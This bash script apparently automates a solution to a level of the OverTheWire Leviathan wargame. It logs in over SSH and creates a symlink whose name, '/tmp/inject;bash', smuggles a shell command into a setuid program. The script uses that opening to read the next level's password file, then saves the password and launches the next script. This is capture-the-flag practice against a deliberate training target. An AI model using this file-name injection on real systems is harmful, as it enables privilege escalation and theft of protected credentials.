#! /bin/bash

# Start program for leviathan

PASS2=$(cat ./level_pass/level2)

PASS3=$(sshpass -p "$PASS2" ssh leviathan2@leviathan.labs.overthewire.org -p 2223 " ln -s /etc/leviathan_pass/leviathan2 '/tmp/inject;bash'; echo 'cat /etc/leviathan_pass/leviathan3' > /tmp/cmd; ./printfile '/tmp/inject;bash' < /tmp/cmd 2> /dev/null")

tput setab 7;tput setaf 1;echo "The password for level3: $PASS3";tput sgr0

echo "$PASS3" > ./level_pass/level3

chmod u+x ./level3.sh
./level3.sh
